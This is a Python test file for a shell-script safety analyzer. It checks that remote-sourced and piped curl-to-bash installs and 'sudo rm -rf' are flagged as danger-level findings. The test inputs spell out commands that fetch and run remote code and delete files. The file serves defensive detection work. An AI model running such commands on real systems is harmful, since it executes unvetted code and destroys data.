from src.analyzer.rules import analyze_script


def _find_rule(findings, rule_id):
    return [f for f in findings if f.rule_id == rule_id]


def test_detects_remote_source():
    txt = "source <(curl -fsSL https://example.com/whatever)\n echo hi"
    findings = analyze_script(txt)
    assert len(findings) >= 1
    # should include R001 (remote source) and be a danger
    r = _find_rule(findings, "R001")
    assert r and r[0].severity == "danger"


def test_detects_piped_curl_and_rm():
    txt = "curl -s http://example.com/install.sh | bash\nsudo rm -rf /tmp/test\n"
    findings = analyze_script(txt)
    assert _find_rule(findings, "R002")  # piped curl
    assert _find_rule(findings, "R004")  # dangerous rm -rf
    # piped curl should be danger
    assert any(f.rule_id == "R002" and f.severity == "danger" for f in findings)
    # rm -rf should be danger
    assert any(f.rule_id == "R004" and f.severity == "danger" for f in findings)
